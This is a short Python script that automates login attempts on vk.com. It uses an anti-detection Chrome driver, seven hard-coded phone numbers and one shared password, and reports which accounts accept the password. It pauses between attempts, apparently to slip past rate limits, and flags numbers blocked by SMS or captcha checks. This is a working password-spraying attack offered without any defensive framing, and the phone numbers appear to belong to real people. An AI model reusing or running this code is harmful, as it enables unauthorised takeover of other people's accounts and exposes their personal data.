import undetected_chromedriver as uc
from time import sleep

import os, sys

from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(CURRENT_DIR))

from driver.base_page import BasePage
from selenium import webdriver


class AccTest(BasePage):
    pass


list_number = ["79290909156",
               "79290910725",
               "79290904409",
               "79290912957",
               "79290911850",
               "79290916968",
               "79290912811"]

if __name__ == "__main__":

    n = 0
    for number in list_number:

        options = webdriver.ChromeOptions()
        driver = uc.Chrome(options=options)
        driver.delete_all_cookies()
        driver.get('https://vk.com/')
        t = AccTest(driver)
        n += 1
        if n % 3 == 0:
            sleep(30)
        try:

            t.type_in('//input[@name="login"]', ('+' + number))
            t.click_on('//button[contains (@class, "VkIdForm__signInButton")]')
            sleep(5)
            t.click_on('//button[contains (@class, "vkc__Bottom__switchToPassword")]')
            sleep(5)
            if t.is_element_displayed('//input[@name="password"]'):

                t.type_in('//input[@name="password"]', 'Ab123456!')
                t.click_on('//button[@type="submit"]')
                if t.is_element_displayed('//nav[@class="side_bar_nav"]'):
                    print(number + '-valid')
                    driver.quit()
                else:
                    print(number + '-fail')
                    driver.quit()
            else:
                print(number + '-HZ(sms or kapcha)')
                driver.quit()
        except:
            sleep(30)
        if driver:
            driver.quit()

print()
# form[@class="vkc__Captcha__container"]
